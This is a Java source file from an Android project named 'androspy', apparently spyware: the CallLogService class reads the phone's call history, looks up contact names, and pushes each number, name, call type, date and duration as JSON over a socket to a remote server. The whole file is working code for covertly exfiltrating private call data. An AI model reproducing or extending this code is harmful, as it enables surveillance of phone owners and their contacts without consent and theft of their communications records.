package buddy.ap.com.androspy;

import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;

public class CallLogService extends Thread implements Runnable {

    private static String TAG = "CallLogService";

    Client client;
    int numlogs;

    public CallLogService(Client client, int numlogs) {
        this.client = client;
        this.numlogs = numlogs;
    }

    @Override
    public void run() {
        super.run();

        getCallLogs();
    }

    private void getCallLogs() {

        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        Uri callUri = Uri.parse("content://call_log/calls");
        Cursor managedCursor = client.getApplicationContext().getContentResolver().query(callUri, null, null, null, strOrder);
        int id = managedCursor.getColumnIndex(CallLog.Calls._ID);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

        int i = 0;
        while (managedCursor.moveToNext()) {
            if (i < this.numlogs) {
                String phNumber = managedCursor.getString(number);
                String nameS = client.getContactName(client.getApplicationContext(), phNumber);
                String callType = managedCursor.getString(type);
                String callDate = managedCursor.getString(date);
                Date callDayTime = new Date(Long.valueOf(callDate));
                String callDuration = managedCursor.getString(duration);
                SimpleDateFormat dt = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                try {
                    HashMap p = new HashMap();
                    p.put("uid", client.getUid());
                    p.put("call_id", Integer.toString(id));
                    p.put("type", callType);
                    p.put("phone", phNumber);
                    p.put("name", nameS);
                    p.put("date", dt.format(callDayTime));
                    p.put("duration", callDuration);

                    JSONObject obj = new JSONObject(p);
                    client.getSocket().emit("call_log:push", obj);

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            i++;
        }
        managedCursor.close();
    }
}
